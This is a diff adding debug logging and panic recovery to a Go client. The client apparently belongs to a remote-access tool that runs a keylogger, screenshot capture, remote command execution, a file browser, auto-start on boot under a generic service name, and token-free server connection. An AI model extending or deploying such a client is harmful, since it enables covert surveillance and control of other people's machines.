@@ -54,20 +54,37 @@ type Config struct {
 
 // NewClient creates a new client instance
 func NewClient(config *Config) *Client {
+	log.Printf("[DEBUG] NewClient: Starting client creation")
+	log.Printf("[DEBUG] NewClient: Creating terminal manager")
 	terminalMgr := NewTerminalManager()
 
+	log.Printf("[DEBUG] NewClient: Creating command executor")
+	cmdExec := NewCommandExecutor()
+	log.Printf("[DEBUG] NewClient: Creating file browser")
+	fileBrowser := NewFileBrowser()
+	log.Printf("[DEBUG] NewClient: Creating screenshot capture")
+	screenshot := NewScreenshotCapture()
+	log.Printf("[DEBUG] NewClient: Creating keylogger")
+	keylogger := NewKeylogger()
+	log.Printf("[DEBUG] NewClient: Creating updater")
+	updater := NewUpdater(ClientVersion)
+	log.Printf("[DEBUG] NewClient: Creating auto-start handler")
+	autoStart := NewAutoStart("ServerManagerClient")
+
+	log.Printf("[DEBUG] NewClient: Assembling client struct")
 	client := &Client{
 		config:      config,
-		commandExec: NewCommandExecutor(),
-		fileBrowser: NewFileBrowser(),
-		screenshot:  NewScreenshotCapture(),
-		keylogger:   NewKeylogger(),
-		updater:     NewUpdater(ClientVersion),
-		autoStart:   NewAutoStart("ServerManagerClient"),
+		commandExec: cmdExec,
+		fileBrowser: fileBrowser,
+		screenshot:  screenshot,
+		keylogger:   keylogger,
+		updater:     updater,
+		autoStart:   autoStart,
 		terminalMgr: terminalMgr,
 		sendChan:    make(chan *common.Message, 256),
 		stopChan:    make(chan bool),
 	}
+	log.Printf("[DEBUG] NewClient: Client created successfully")
 
 	// Set terminal output callbacks
 	terminalMgr.SetOutputCallback(func(sessionID, data string) {
@@ -588,11 +605,26 @@ func (c *Client) sendHeartbeat() {
 
 // Main is the main entry point for the client
 func Main() {
+	defer func() {
+		if r := recover(); r != nil {
+			log.Printf("[PANIC] Recovered from panic: %v", r)
+			log.Printf("[PANIC] Waiting 30 seconds before exit to allow log review...")
+			time.Sleep(30 * time.Second)
+			os.Exit(1)
+		}
+	}()
+
+	log.SetFlags(log.LstdFlags | log.Lshortfile)
+	log.Printf("[DEBUG] Main: Starting client initialization")
+	log.Printf("[DEBUG] Main: Go version: %s, OS: %s, Arch: %s", runtime.Version(), runtime.GOOS, runtime.GOARCH)
+
 	// Parse command line flags
 	serverURL := flag.String("server", "wss://localhost/ws", "Server WebSocket URL (use wss:// for HTTPS)")
 	autoStart := flag.Bool("autostart", false, "Enable auto-start on boot")
 	daemon := flag.Bool("daemon", false, "Run as background daemon/service")
+	log.Printf("[DEBUG] Main: Parsing command line flags")
 	flag.Parse()
+	log.Printf("[DEBUG] Main: Flags parsed - server=%s, autostart=%v, daemon=%v", *serverURL, *autoStart, *daemon)
 
 	// Run as daemon if requested
 	if *daemon && !IsDaemon() {
@@ -616,14 +648,18 @@ func Main() {
 	}
 
 	// Generate machine ID automatically
+	log.Printf("[DEBUG] Main: Creating machine ID generator")
 	idGen := NewMachineIDGenerator()
+	log.Printf("[DEBUG] Main: Getting machine ID")
 	machineID, err := idGen.GetMachineID()
 	if err != nil {
 		// Fallback: use hostname + time-based hash to avoid exit
+		log.Printf("[DEBUG] Main: Machine ID generation failed: %v", err)
 		host, _ := os.Hostname()
 		machineID = fmt.Sprintf("fallback-%s-%d", host, time.Now().Unix())
 		log.Printf("Warning: using fallback machine ID: %s (error: %v)", machineID, err)
 	}
+	log.Printf("[DEBUG] Main: Machine ID obtained: %s", machineID)
 
 	log.Printf("Machine ID: %s", machineID)
 	log.Printf("Authentication: Using machine ID (no token required)")
@@ -636,7 +672,9 @@ func Main() {
 	}
 
 	// Create and start client
+	log.Printf("[DEBUG] Main: Creating client instance")
 	client := NewClient(config)
+	log.Printf("[DEBUG] Main: Client created, starting connection loop")
 	for {
 		if err := client.Start(); err != nil {
 			log.Printf("Failed to start client: %v (retrying in 10s)", err)
@@ -646,6 +684,7 @@ func Main() {
 		break
 	}
 
+	log.Printf("[DEBUG] Main: Client started successfully, entering wait loop")
 	// Wait for termination signal
 	select {}
 }
